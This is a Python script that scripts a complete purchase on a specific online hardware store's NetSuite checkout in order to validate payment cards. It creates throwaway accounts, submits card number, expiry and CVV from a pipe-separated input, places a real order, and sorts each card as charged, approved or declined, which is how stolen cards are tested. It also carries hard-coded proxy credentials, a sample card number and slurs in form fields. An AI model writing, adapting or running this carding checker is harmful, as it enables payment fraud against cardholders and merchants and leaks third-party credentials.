import random
import re
import uuid
import names
from requests import Session
from dataclasses import dataclass
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ConfigsPAge:
    def curt_str(self, text, start_delim):
        pattern = f'{re.escape(start_delim)}(.*?)(?=<|$)'
        match = re.search(pattern, text)
        if match:
            return match.group(0).strip()  
        else:
            return None  
        
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):
            self.uophs = data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
            try:
                return self.uophs
            
            except: 
                return 'value not found' 
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id
    @classmethod
    def Ccs(self, cards:str=None):
        if '|' in cards: 
            return cards.split('|')
        elif ':' in cards: 
            return cards.split(':')
        elif ',' in cards: 
            return cards.split(',')
        elif '-' in cards: return cards.split('-')

        return cards
    @classmethod
    def RandomName(self,dato:str=None):
        if dato == 'username': 
            self.username = "{}{}{}".format(
                    names.get_first_name(),
                    names.get_last_name(),
                    random.randint(1000000,9999999)
                    )
            return self.username
        
        elif dato == 'email': 
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.email

        else:
            return 'valores incorrectos: >>>   BehaviorsBraintree().RandomName("username")'
    @classmethod
    def SaveResponseHhml(self, response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)

proxy_url = 'http://user-default-network-res-country-ca:T8RdYip2FvTl@proxy.proxiware.com:1337'
class pezezyysalchi:
    def main(self,card):
     #   try:
            self.ccs = card.split('|')
            self.Nombre = ConfigsPAge().RandomName('username')
            self.UseMail = ConfigsPAge().RandomName('email')

            self.session = Session()


            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            response = self.session.get('http://hardware.magellandc.com/s.nl/it.A/id.395242/.f', headers=headers, verify=False)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Origin': 'http://hardware.magellandc.com','Referer': 'http://hardware.magellandc.com/s.nl/it.A/id.395242/.f','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'c': '956353','n': '1','buyid': '395242','category': '','itemid': '395242','qty': '1',}
            response = self.session.post('http://hardware.magellandc.com/app/site/backend/additemtocart.nl', headers=headers, data=data, verify=False,)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Referer': 'http://hardware.magellandc.com/s.nl/it.A/id.395242/.f','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            params = {'it': 'A','id': '395242','whence': '',}
            response = self.session.get('http://hardware.magellandc.com/s.nl', params=params, headers=headers, verify=False)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Connection': 'keep-alive','Referer': 'http://hardware.magellandc.com/s.nl?it=A&id=395242&whence=','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            r1 = self.session.get('http://hardware.magellandc.com/s.nl/sc.3/.f', headers=headers, verify=False)
            time = ConfigsPAge().QueryText(r1.text, "name='cktime' value='", "'")
            vid = ConfigsPAge().QueryText(r1.text, "name='vid' value='", "'")
            ck = ConfigsPAge().QueryText(r1.text, "name='ck' value='", "'")
            cart = ConfigsPAge().QueryText(r1.text, "name='cart' value='", "'")
            c = ConfigsPAge().QueryText(r1.text, "name='c' value='", "'")

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Origin': 'http://hardware.magellandc.com','Referer': 'http://hardware.magellandc.com/s.nl/sc.3/.f','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = [('c', f'{c}'),('n', '1'),('sc', '3'),('category', '-103'),('id', ''),('it', 'A'),('ck', f'{ck}'),('cktime', f'{time}'),('cart', f'{cart}'),('c', f'{c}'),('n', '1'),('redirect', ''),('item395242set3619', '1'),('country', 'US'),('zip', '10036'),('submitter', 'Submit'),]
            response = self.session.post('http://hardware.magellandc.com/s.nl', headers=headers, data=data, verify=False)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Origin': 'http://hardware.magellandc.com','Referer': 'http://hardware.magellandc.com/s.nl?sc=3&whence=','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = [('c', f'{c}'),('n', '1'),('sc', '3'),('category', '-103'),('id', ''),('it', 'A'),('vid', f'{vid}'),('ck', f'{ck}'),('cktime', f'{time}'),('cart', f'{cart}'),('c', f'{c}'),('n', '1'),('redirect', f'https://956353.secure.netsuite.com/s.nl?c={c}&n=1&sc=4&vid={vid}&chrole=17&ck={ck}&cktime={time}&cart={cart}&promocode=&promocodeaction=overwrite&shipmeth=848592&sj=yNtEnUIZ2giXJqkSkpfFyD8XT%3B1743788662%3B695785148&addrzip=10036'),('item395242set3619', '1'),('country', 'US'),('zip', '10036'),('shippingcarrierselect', 'nonups'),('sShipMeth', '848592'),('checkout', 'Proceed to Checkout'),]
            response = self.session.post('http://hardware.magellandc.com/s.nl', headers=headers, data=data, verify=False)   

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Referer': 'http://hardware.magellandc.com/','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            params = {'c': f'{c}','n': '1','sc': '4','vid': f'{vid}','chrole': '17','ck': f'{ck}','cktime': f'{time}','cart': f'{cart}','promocode': '','promocodeaction': 'overwrite','shipmeth': '848592','sj': 'yNtEnUIZ2giXJqkSkpfFyD8XT;1743788662;695785148','addrzip': '10036','whence': '',}
            response = self.session.get('https://956353.secure.netsuite.com/s.nl', params=params, headers=headers)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Referer': 'http://hardware.magellandc.com/','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            params = {'whence': '',}
            response = self.session.get('https://956353.secure.netsuite.com/s.nl/c.956353/sc.4/n.1/.f', params=params, headers=headers,)
            
            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://956353.secure.netsuite.com','Referer': 'https://956353.secure.netsuite.com/s.nl?c=956353&n=1&sc=4&login=T&reset=T&newcust=T','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            params = {'newcust': 'T',}
            data = {'origsc': '4','c': f'{c}','n': '1','sc': '4','category': 'login-register','id': '','it': 'A','vid': f'{vid}','ck': f'{ck}','cktime': f'{time}','cart': f'{cart}','login': 'T','new': 'T','review': 'F','createaccount': 'T','firstName': 'Derek','lastName': 'Andrade','company': 'Niggasshit','email': self.UseMail,'custentity_4599_sg_uen': '','custentity_my_brn': '','partner': '','pwd': 'Cuenta1234','newpwd2': 'Cuenta1234','confirmSpinLock': '0',}
            response = self.session.post('https://956353.secure.netsuite.com/app/site/backend/customerlogin.nl', params=params, headers=headers, data=data,)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Connection': 'keep-alive','Referer': 'https://956353.secure.netsuite.com/app/site/backend/docrossdomainredirect.nl?redirect=%2Fs.nl%3Fc%3D956353%26n%3D1%26sc%3D4&c=956353&rh=5c7c8ed961ae05826c5bbbceda163c88d22720d5&docookiecheck=T&whence=','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            params = {'c': f'{c}','n': '1','sc': '4',}
            response = self.session.get('https://956353.secure.netsuite.com/s.nl', params=params, headers=headers)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Connection': 'keep-alive','Referer': 'https://956353.secure.netsuite.com/app/site/backend/docrossdomainredirect.nl?redirect=%2Fs.nl%3Fc%3D956353%26n%3D1%26sc%3D4&c=956353&rh=5c7c8ed961ae05826c5bbbceda163c88d22720d5&docookiecheck=T&whence=','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            params = {'c': f'{c}','n': '1','sc': '4','category': 'billing','type': 'shipping','whence': '',}
            r2 = self.session.get('https://956353.secure.netsuite.com/s.nl', params=params, headers=headers)
            csrf = ConfigsPAge().QueryText(r2.text, 'name="_csrf" id="_csrf" type="hidden" value="', '"')
            nkey = ConfigsPAge().QueryText(r2.text, 'name="_eml_nkey_" id="_eml_nkey_" type="hidden" value="', '"')
            nsapict = ConfigsPAge().QueryText(r2.text, 'name="nsapiCT" id="nsapiCT" type="hidden" value="', '"')

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://956353.secure.netsuite.com','Referer': 'https://956353.secure.netsuite.com/s.nl?c=956353&n=1&sc=4&category=billing&type=shipping&whence=','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            params = {'sc': '4',}
            data = f'attention_input=saddada+fsafafasf&addressee_input=niggas&addr1=Times+Square%2C+Nueva+York%2C+EE.+UU.&addr2=&city=Manhattan&state=NY&dropdownstate=NY&zip=10036&country=US&phone=%28566%29+783-4595&defaultbilling=T&submitter=Continue&_eml_nkey_={nkey}&selectedtab=&nsapiPI=&nsapiSR=&nsapiVF=&nsapiFC=&nsapiPS=&nsapiVI=&nsapiVD=&nsapiPD=&nsapiVL=&nsapiRC=&nsapiLI=&nsapiLC=&nsapiCT={nsapict}&nsbrowserenv=istop%3DT&type=NONE_NEEDED&id=&externalid=&whence=&customwhence=&entryformquerystring=c%3D956353%26n%3D1%26sc%3D4%26category%3Dbilling%26type%3Dshipping&c=956353&n=1&sc=4&category=billing&_csrf={csrf}&attention=saddada+fsafafasf&addressee=niggas&label=Times+Square%2C+Nueva+York%2C+EE.+UU.&kAddrEntity=7069682&isresidential=F&defaultshipping=T&submitted=T&clickedback=&formdisplayview=NONE&_button='
            response = self.session.post('https://956353.secure.netsuite.com/app/site/backend/customeraddress.nl', params=params, headers=headers, data=data,)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Referer': 'https://956353.secure.netsuite.com/s.nl?c=956353&n=1&sc=4&category=billing&type=shipping&whence=','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            params = {'c': f'{c}','sc': '4','whence': '','n': '1',}
            response = self.session.get('https://956353.secure.netsuite.com/s.nl', params=params, headers=headers)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://956353.secure.netsuite.com','Referer': 'https://956353.secure.netsuite.com/s.nl?c=956353&sc=4&whence=&n=1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'origsc': '4','c': f'{c}','n': '1','sc': '4','category': 'shipping','id': '','it': 'A','_csrf': csrf,'vid': f'{vid}','ck': f'{ck}','cktime': f'{time}','cart': f'{cart}','shippingcarrierselect': 'ups','sShipMeth': '4','continueclicked': 'T','submitter': 'Continue',}
            response = self.session.post('https://956353.secure.netsuite.com/s.nl', headers=headers, data=data)

            self.ccs = ConfigsPAge().Ccs(card)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://956353.secure.netsuite.com','Referer': 'https://956353.secure.netsuite.com/s.nl?c=956353&n=1&sc=4','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            params = {'c': f'{c}','n': '1','sc': '4',}
            data = {'origsc': '4','c': f'{c}','n': '1','sc': '4','category': 'paymeth','id': '','it': 'A','_csrf': f'{csrf}','vid': f'{vid}','ck': f'{ck}','cktime': f'{time}','cart': f'{cart}','sPayMeth': '5,1,1555641112','paymentInstrumentId': '','sCardNum': f'{self.ccs[0]}','sExpMo': f'{self.ccs[1]}','sExpYr': f'{self.ccs[2]}','sCardName': 'saddada fsafafasf','ccsecuritycode': f'{self.ccs[3]}','sIssueNo': '','sValidFromMo': '','sValidFromYr': '','sSaveMe': 'T','submitter': 'Continue',}
            response = self.session.post('https://956353.secure.netsuite.com/app/site/backend/customerpaymeth.nl', params=params, headers=headers, data=data,)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Referer': 'https://956353.secure.netsuite.com/s.nl?c=956353&n=1&sc=4','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            params = {'c': f'{c}','sc': '4','whence': '','n': '1',}
            response = self.session.get('https://956353.secure.netsuite.com/s.nl', params=params, headers=headers)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://956353.secure.netsuite.com','Referer': 'https://956353.secure.netsuite.com/s.nl?c=956353&sc=4&whence=&n=1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = [('origsc', '4'),('c', f'{c}'),('n', '1'),('sc', '4'),('category', 'confirm'),('id', ''),('it', 'A'),('_csrf', f'{csrf}'),('vid', f'{vid}'),('ck', f'{ck}'),('cktime', f'{time}'),('cart', f'{cart}'),('taxitem', ''),('taxrate', '0.0'),('discountistaxable', 'F'),('taxtotal', '0.0'),('discounttotal', '0.0'),('discountitem', ''),('discountrate', ''),('total', '27.55'),('hash', 'AAFdikaIx7np5Hqk9WR7lKAk4WfW5wSHrWYDZx-86DmQd8v0cfI'),('shiptotal', '20.6'),('shippingcarrierselect', 'ups'),('sShipMeth', '4'),('continueclicked', 'T'),('otherrefnum', ''),('custbody_vpy_order_id', ''),('c', '956353'),('n', '1'),('redirect', ''),('confirmSpinLock', '0'),('createquote', 'F'),]
            response = self.session.post('https://956353.secure.netsuite.com/app/site/backend/placeorder.nl', headers=headers, data=data,)

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Referer': 'https://956353.secure.netsuite.com/s.nl?c=956353&sc=4&whence=&n=1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            params = {'c': f'{c}','sc': '4','category': 'confirm','whence': '','checkoutmsg': 'CreditCardAuth','n': '1',}
            response = self.session.get('https://956353.secure.netsuite.com/s.nl', params=params, headers=headers)
            self.session.close()
            resp = ConfigsPAge().curt_str(response.text, 'Reason:')
            
            if resp == "success":
                status = "Charged $27.55 ✅"
            elif resp == "Reason: Insufficient Funds":
                status = "Approved! ✅"
            else:
                status = "Declined! ❌"
            return status, resp 
      #  except: 
   #        # return 'Declined! ❌','Invalid CC Number Account'

   
        

if __name__ == "__main__":
    card = "4426441313931192|10|2028|818"  # Example card details
    result = pezezyysalchi().main(card)
    print(result)  # Output the result of the transaction attempt